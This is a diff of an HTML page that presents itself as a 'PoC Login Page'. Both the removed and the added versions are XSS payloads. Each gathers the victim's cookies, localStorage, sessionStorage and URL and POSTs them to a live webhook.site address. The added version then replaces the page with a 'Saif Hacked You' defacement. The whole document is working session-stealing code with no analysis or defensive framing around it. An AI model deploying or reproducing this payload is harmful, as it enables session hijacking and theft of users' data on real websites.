@@ -1,21 +1,49 @@
-<script>
-(async () => {
-  alert("💀 Hacked by S7if 💀");
-  const data = {
-    cookies: document.cookie,
-    localStorage: {...localStorage},
-    sessionStorage: {...sessionStorage},
-    url: location.href,
-    referrer: document.referrer,
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    time: new Date().toISOString()
-  };
-  await fetch("https://webhook.site/3dd75195-9a2f-4eb2-90e4-a036f13bdd9b", {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify(data)
-  });
-})();
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC Login Page</title>
+</head>
+<body>
+  <h1>Please wait...</h1>
 
+  <script>
+    (function() {
+      let data = `
+🍪 Cookies:
+${document.cookie}
+
+📦 LocalStorage:
+${JSON.stringify(localStorage, null, 2)}
+
+📦 SessionStorage:
+${JSON.stringify(sessionStorage, null, 2)}
+
+🌍 URL:
+${location.href}
+
+⏰ Time:
+${new Date().toISOString()}
+      `;
+
+      fetch("https://webhook.site/3dd75195-9a2f-4eb2-90e4-a036f13bdd9b", {
+        method: "POST",
+        headers: { "Content-Type": "text/plain" },
+        body: data
+      })
+      .then(() => {
+        alert("XSS triggered and data sent!");
+        document.body.innerHTML = `
+          <div style="padding: 30px; font-family: monospace; font-size: 1.5em; color: #0f0; background-color: #111; min-height: 100vh; display: flex; justify-content: center; align-items: center; text-align: center; flex-direction: column;">
+            <div>👾 Saif Hacked You 👾</div>
+            <div style="margin-top: 20px; font-size: 0.7em; color: #afa;">Your session has been terminated.</div>
+          </div>
+        `;
+      })
+      .catch(() => {
+        // لو حصل خطأ في الإرسال، نعرض alert برضه
+        alert("XSS triggered but failed to send data!");
+      });
+    })();
+  </script>
+</body>
+</html>
